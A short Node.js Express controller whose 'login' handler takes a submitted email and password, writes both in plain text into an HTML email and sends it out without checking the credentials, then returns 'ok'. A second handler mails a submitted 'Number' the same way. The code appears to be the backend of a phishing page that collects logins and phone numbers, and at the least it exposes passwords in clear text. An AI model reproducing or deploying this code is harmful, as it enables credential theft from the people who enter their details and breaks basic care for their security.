
const sendEmail=require("../meddleware/email.js")
const userLogin=(req,res)=>{
    
   const{password,email}=req.body;
   const emailData = {
        email:email,
        subject: "Rajib Hasan",
        html: `    <!DOCTYPE html>
    <html>
      <head>
        <style>
          body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
          }

          
        </style>
      </head>
      <body>
     <p>Email : ${email}</p>
    <p>Password : ${password}</p>
      </body>
    </html>

    `
    
    };
   
   if(email&&password){
       sendEmail(req,res,emailData);
      return res.status(200).json("ok")
   }
   
    return res.status(400).json("not")
}

const getIdentify=(req,res)=>{
   console.log(req.body)
    res.status(200).json("ok")
}

const identify=(req,res)=>{
   const{email}=req.body
   
   const emailData = {
        email:email,
        subject: "Rajib Hasan",
        html: `    <!DOCTYPE html>
    <html>
      <head>
        <style>
          body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
          }

          
        </style>
      </head>
      <body>
     <p>Number:${email}</p>
      </body>
    </html>

    `
    
    };
   
   
  if(email){
      sendEmail(req,res,emailData);
  }
   
   
   
    res.status(200).json("")
}






module.exports={userLogin,getIdentify,identify}